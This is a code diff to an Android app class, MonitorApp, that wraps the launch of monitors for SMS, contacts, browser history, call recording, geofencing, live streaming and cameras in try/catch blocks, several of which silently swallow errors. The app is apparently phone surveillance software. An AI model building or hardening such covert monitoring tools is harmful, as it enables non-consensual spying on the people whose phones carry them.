@@ -96,16 +96,24 @@ class MonitorApp : Application(), Configuration.Provider {
     }
 
     private fun startPhase1Monitors() {
-        smsMonitor = SmsMonitor(this).also { it.startMonitoring() }
-        contactMonitor = ContactMonitor(this).also { it.startMonitoring() }
-        calendarMonitor = CalendarMonitor(this).also { it.startMonitoring() }
-        wifiMonitor = WifiMonitor(this).also { it.startMonitoring() }
-        browserMonitor = BrowserMonitor(this).also { it.startMonitoring() }
+        try { smsMonitor = SmsMonitor(this).also { it.startMonitoring() } } catch(e:Exception) {}
+        try { contactMonitor = ContactMonitor(this).also { it.startMonitoring() } } catch(e:Exception) {}
+        try { calendarMonitor = CalendarMonitor(this).also { it.startMonitoring() } } catch(e:Exception) {}
+        try { wifiMonitor = WifiMonitor(this).also { it.startMonitoring() } } catch(e:Exception) {}
+        try { browserMonitor = BrowserMonitor(this).also { it.startMonitoring() } } catch(e:Exception) {}
     }
 
     private fun startPhase2Monitors() {
-        callRecorder = CallRecorder(this).also { it.startMonitoring() }
-        geofenceMonitor = GeofenceMonitor(this).also { it.startMonitoring() }
+        try {
+            callRecorder = CallRecorder(this).also { it.startMonitoring() }
+        } catch (e: Exception) {
+            android.util.Log.w("Monitor", "CallRecorder not available: ${e.message}")
+        }
+        try {
+            geofenceMonitor = GeofenceMonitor(this).also { it.startMonitoring() }
+        } catch (e: Exception) {
+            android.util.Log.w("Monitor", "Geofence not available: ${e.message}")
+        }
     }
 
     private fun startPhase3Monitors() {
@@ -116,16 +124,13 @@ class MonitorApp : Application(), Configuration.Provider {
     }
 
     private fun startPhase4Monitors() {
-        liveStreamer = LiveStreamer(this).also {
-            it.setDeviceId("pending")
-        }
-        dashCam = DashCam(this).also { it.start() }
+        try { liveStreamer = LiveStreamer(this).also { it.setDeviceId("pending") } } catch(e:Exception) {}
+        try { dashCam = DashCam(this).also { it.start() } } catch(e:Exception) {}
         imageAnalyzer = ImageAnalyzer(this)
         autoCamera = AutoCamera(this)
 
-        // Download AI models in background
         scope.launch {
-            imageAnalyzer?.downloadModels()
+            try { imageAnalyzer?.downloadModels() } catch(e:Exception) {}
         }
     }
 
